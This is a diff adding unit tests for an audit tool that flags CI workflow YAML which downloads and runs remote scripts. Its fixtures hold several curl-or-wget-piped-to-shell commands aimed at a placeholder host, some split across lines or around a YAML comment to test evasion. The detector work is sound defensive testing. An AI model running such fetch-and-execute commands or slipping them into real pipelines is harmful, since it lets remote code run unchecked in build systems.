@@ -378,6 +378,65 @@ class RatchetTests(unittest.TestCase):
         self.write("jobs:\n  x:\n    steps:\n      - run: /usr/bin/env bash <(curl -fsSL https://example.invalid/i)\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_yaml_plain_multiline_curl_pipe_to_bash_detected(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i |\n"
+            "          bash\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_yaml_plain_multiline_wget_pipe_to_busybox_detected(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: wget -qO- https://example.invalid/i |\n"
+            "          busybox sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_yaml_plain_multiline_with_yaml_comment_keeps_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i |\n"
+            "          # shell executor lives after YAML comment\n"
+            "          sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_yaml_plain_multiline_safe_output_filter_not_executing(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/data.json |\n"
+            "          jq .\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_yaml_plain_run_same_indent_following_key_not_joined(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: echo no execution\n"
+            "        env:\n"
+            "          TEST_KEY: bash\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_yaml_plain_multiline_pipeline_old_blob_grandfathered(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i |\n"
+            "          bash\n"
+        )
+        old = self.commit()
+        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
+        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: curl -fsSL https://example.invalid/i |\n"
+            "          bash\n"
+            "      - run: echo changed\n"
+        )
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_yaml_folded_run_block_remote_shell_denied(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: >\n          curl -fsSL https://example.invalid/i\n          | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
